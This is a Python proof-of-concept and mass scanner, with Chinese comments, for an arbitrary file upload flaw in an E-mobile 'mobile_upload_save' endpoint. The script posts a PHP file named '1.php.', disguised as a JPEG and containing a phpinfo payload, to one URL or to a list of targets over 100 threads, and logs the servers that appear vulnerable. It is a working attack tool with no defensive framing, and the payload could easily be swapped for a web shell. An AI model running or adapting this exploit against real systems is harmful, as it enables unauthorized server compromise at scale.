import requests,sys,argparse,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """
███████╗ █████╗ ██╗   ██╗███████╗██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗ 
██╔════╝██╔══██╗██║   ██║██╔════╝██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗
███████╗███████║██║   ██║█████╗  ██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║
╚════██║██╔══██║╚██╗ ██╔╝██╔══╝  ██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║
███████║██║  ██║ ╚████╔╝ ███████╗╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝
╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝ ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝                                                                                                                                                                                                                                                                                                                                                                                                                            
                                                           
                                                                    version: 1.0
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description='QLBSQL! ')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save"
    url = target+payload_url
    headers={
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
        'Connection': 'close',
        'Content-Length': '350'
    }
    data = (
        "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\r\n"
        'Content-Disposition: form-data; name="upload_quwan"; filename="1.php."\r\n'
        'Content-Type: image/jpeg\r\n'
        "\r\n"
        '<?php phpinfo();?>\r\n'
        "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\r\n"
    )
    # proxie = {
    #     'http' : 'http://127.0.0.1:8080',
    #     'https' : 'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=10)
        if res.status_code == 200 and "attachment" in res.text :
            print(f"[+]该url存在漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
                        return True
        else:
            print(f"[-]该url不存在漏洞{target}")
    except :
        print(f"[*]该url存在问题{target}")
        return False

if __name__ == '__main__':
    main()